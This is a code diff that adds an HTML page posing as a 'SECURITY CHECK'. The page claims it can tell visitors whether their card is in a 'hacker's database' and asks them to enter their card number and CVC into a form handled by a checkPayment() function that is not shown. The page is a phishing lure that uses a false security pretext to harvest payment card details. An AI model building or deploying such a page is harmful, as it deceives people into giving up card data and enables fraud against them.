@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Transaction</title>
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <div class="main">
+      <div class="headingsorwhatever">
+        <h1>SECURITY CHECK</h1>
+        <img src="./pngegg.png" alt="Visa etc" />
+      </div>
+      <div class="para">
+        Is there your card in hacker's database?
+        <br />
+        You can Easily check here, just enter your card info:
+      </div>
+      <form id="formm" action="">
+        <label for="cardNo">Card No.</label>
+        <input class="INPUT" type="text" id="cardNo" required /><br />
+        <label for="cvc">CVC</label>
+        <input class="cvc" type="text" id="cvc" required /><br />
+        <button type="button" onclick="checkPayment()">Check!</button>
+      </form>
+    </div>
+  </body>
+</html>
